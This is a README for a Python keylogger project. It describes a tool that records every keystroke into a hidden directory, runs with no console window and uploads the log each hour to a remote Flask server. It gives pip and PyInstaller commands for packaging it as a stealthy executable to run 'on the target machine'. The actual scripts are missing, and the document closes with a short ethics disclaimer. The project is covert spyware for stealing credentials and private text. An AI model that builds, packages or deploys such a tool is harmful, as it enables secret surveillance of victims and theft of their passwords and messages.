# Keylogger Project

## Overview

This project implements a keylogger in Python, which logs all keystrokes to a file and periodically sends the log file to a web server. The keylogger runs in the background without displaying a console window.

## Prerequisites

- Python 3.x
- `pynput` library
- `requests` library
- `flask` library (for the server)

## Installation

1. **Clone the repository or download the source code.**

2. **Install the required Python libraries:**

    ```bash
    pip install pynput requests flask
    ```

## Keylogger Script

1. **Save the keylogger script as `keylogger.py`:**

2. **Modify the server URL:** Replace `'http://your-server-ip:5000/upload'` with the actual URL of your web server.

3. **Convert the script to an EXE using PyInstaller:** -> In CMD

    ```bash

    pyinstaller --onefile --noconsole keylogger.py

    ```

it will create EXE file.

## Flask Web Server

1. **Save the following script as `server.py`:**


2. **Run the Flask web server:**

    ```bash
    python server.py
    ```

## Usage

1. **Run the web server (`server.py`)** on a machine with a static IP or domain name.

2. **Run the keylogger executable (`keylogger.exe`)** on the target machine.

The keylogger will log all keystrokes to a file named `keylog.txt` in a hidden directory in the user's home directory. Every hour, the log file will be sent to the web server.


## Ethical and Legal Considerations

- **Explicit Permission:** Always ensure you have explicit permission from the owner of the computer before running a keylogger.
- **Privacy:** Respect privacy and inform users about what you are doing.
- **Legal Boundaries:** Be aware of and comply with local laws regarding keylogging and monitoring software.

Use this knowledge responsibly and within legal boundaries.
